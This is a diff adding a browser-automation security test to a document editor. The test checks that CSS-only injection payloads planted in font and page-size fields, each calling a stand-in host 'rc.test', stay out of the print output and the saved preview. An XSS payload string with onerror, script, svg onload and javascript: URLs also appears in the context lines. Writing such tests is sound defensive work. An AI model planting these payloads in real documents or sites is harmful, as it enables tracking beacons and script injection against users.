@@ -153,6 +153,56 @@ try {
     await ctx.close()
   }
 
+  // ───── 0b. CSS-only payloads (NO `<`): only the use-site normalisation stops these
+  // A value like `serif;}*{background:url(http://rc.test/…)}` carries no `<`,
+  // so the `<` escape cannot see it: it is a rule injected into the print CSS
+  // and into the preview saved in every file — a read receipt from any
+  // thumbnailer. Set by a SYNCED op (no parseDoc). Two oracles: the payload
+  // text appears nowhere in the print output or the saved preview, and no
+  // request reaches rc.test while printing or opening the saved file.
+  console.log('\n0b. CSS-only payloads (no `<`) from a synced op reach neither print nor the saved preview\n')
+  const CSSP = (tag) => ({
+    'type.family': (d) => { d.type = { ...(d.type || {}), family: `serif;}*{background:url(http://rc.test/${tag}-family)}` } },
+    'type.size': (d) => { d.type = { ...(d.type || {}), size: `17px;}*{background:url(http://rc.test/${tag}-size)}` } },
+    'page.width': (d) => { d.page.width = `100px;background:url(http://rc.test/${tag}-width)` },
+    'page.height': (d) => { d.page.height = `100px;background:url(http://rc.test/${tag}-height)` },
+    'page.marginTop': (d) => { d.page.marginTop = `10px;background:url(http://rc.test/${tag}-mt)` },
+    'page.marginX': (d) => { d.page.marginX = `10px;background:url(http://rc.test/${tag}-mx)` },
+    'page.marginBottom': (d) => { d.page.marginBottom = `10px;background:url(http://rc.test/${tag}-mb)` },
+  })
+  for (const name of Object.keys(CSSP('x'))) {
+    const hits = []
+    const ctx = await browser.newContext({ acceptDownloads: true })
+    await ctx.addInitScript(() => { delete window.showSaveFilePicker })
+    await ctx.route(/^https?:/, (r) => { if (r.request().url().includes('rc.test')) hits.push(r.request().url()); r.abort() })
+    const p = await ctx.newPage()
+    await p.goto(SHELL.href)
+    await p.waitForFunction(() => window.bento?.doc)
+    // a footnote, so the footnote block's style attribute is printed too
+    await p.evaluate((j) => window.bento.loadDoc(j), JSON.stringify({ format: 'bento/type', docId: 'doc-css', title: 't',
+      footnotes: { n1: 'note' }, body: [{ id: 'b1', kind: 'para', text: 'Hello', notes: [{ id: 'n1', at: 1 }] }] }))
+    await p.evaluate(`const tag = 'p'; (${CSSP('p')[name].toString()})(window.bento.doc)`)
+    const printed = await p.evaluate(async () => {
+      const src = window.bento.printHtml()
+      const f = document.createElement('iframe'); document.body.appendChild(f)
+      f.contentWindow.document.open(); f.contentWindow.document.write(src); f.contentWindow.document.close()
+      await new Promise((r) => setTimeout(r, 600)); f.remove()
+      return src
+    })
+    const dl = p.waitForEvent('download', { timeout: 15000 })
+    await p.evaluate(() => window.bento.save())
+    const saved = readFileSync(await (await dl).path(), 'utf8')
+    const at = saved.indexOf('data-bento-preview'), end = saved.indexOf('<script data-bento-preview', at)
+    const preview = at >= 0 && end > at ? saved.slice(at, end) : ''
+    const file = join(dir, `css-${name}.bento.html`); writeFileSync(file, saved)
+    const o = await ctx.newPage(); await o.goto('file://' + file)
+    await o.waitForFunction(() => window.bento?.doc, null, { timeout: 15000 }).catch(() => {})
+    await o.waitForTimeout(400)
+    ok(preview.length > 0 && !printed.includes('rc.test') && !preview.includes('rc.test') && hits.length === 0,
+      `${name}: a CSS-only payload is in neither the print output (${printed.includes('rc.test')}) nor the saved preview (${preview.includes('rc.test')}), and nothing was requested (${hits.length})${preview ? '' : ' — NO PREVIEW FOUND'}`)
+    await ctx.close()
+  }
+
   // ─────────────────────────────────────────── 1. the builder emits inert markup
   const H = `"'><img src=x onerror="top.__pwned=(top.__pwned||0)+1"><script>top.__pwned=(top.__pwned||0)+1</script></style><style></style><script>top.__pwned=(top.__pwned||0)+1</script><svg onload="top.__pwned=(top.__pwned||0)+1"></svg><iframe srcdoc="x"></iframe><base href="javascript:1"><meta http-equiv="refresh" content="0;url=javascript:1">`
   const JS = 'javascript:top.__pwned=(top.__pwned||0)+1'
